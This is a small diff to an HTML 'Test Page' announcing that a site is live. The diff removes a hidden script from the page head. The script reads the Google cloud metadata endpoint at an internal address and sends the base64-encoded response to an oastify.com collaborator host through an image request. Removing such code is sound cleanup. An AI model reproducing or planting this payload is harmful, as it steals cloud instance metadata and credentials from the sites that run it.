@@ -2,16 +2,7 @@
 <html>
 <head>
   <title>Test Page</title>
-  <script>
-    fetch("http://[fda3:e722:ac3:10:33:dfdf:a05:ad4]/computeMetadata/v1/", {
-      headers: { "Metadata-Flavor": "Google" }
-    })
-    .then(r => r.text())
-    .then(t => {
-      new Image().src = "https://r5xwhm9xrte9x8ftahx4fc651w7nvew2l.oastify.com/" + btoa(t);
-    })
-    .catch(() => {});
-  </script>
+  
 </head>
 <body>
   <h1>It works! Your site is live 🚀</h1>
